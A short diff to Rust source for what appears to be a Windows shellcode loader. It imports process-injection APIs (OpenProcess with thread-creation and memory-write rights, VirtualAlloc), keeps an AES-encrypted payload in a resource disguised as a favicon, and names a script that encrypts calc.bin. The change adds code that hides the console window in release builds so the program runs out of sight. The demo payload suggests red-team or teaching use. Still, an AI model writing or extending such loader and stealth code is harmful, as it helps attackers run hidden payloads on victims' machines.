@@ -11,16 +11,28 @@ use winapi::{
         memoryapi::VirtualAlloc,
         processthreadsapi::OpenProcess,
         winbase::FindResourceA,
+        wincon::GetConsoleWindow,
         winnt::{
             MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PROCESS_CREATE_THREAD,
             PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
         },
         winuser,
+        winuser::{ShowWindow, SW_HIDE},
     },
 };
 
 const FAVICON_ICO: u16 = 100;
 fn main() {
+    // Hide the console window
+    // The rust way :)
+    #[cfg(not(debug_assertions))]
+    unsafe {
+        let console_window = GetConsoleWindow();
+        if !console_window.is_null() {
+            ShowWindow(console_window, SW_HIDE);
+        }
+    }
+
     // Get key and payload by running aesencrypt.py
     // python.exe .\aesencrypt.py calc.bin
     let key: &[u8] = &[
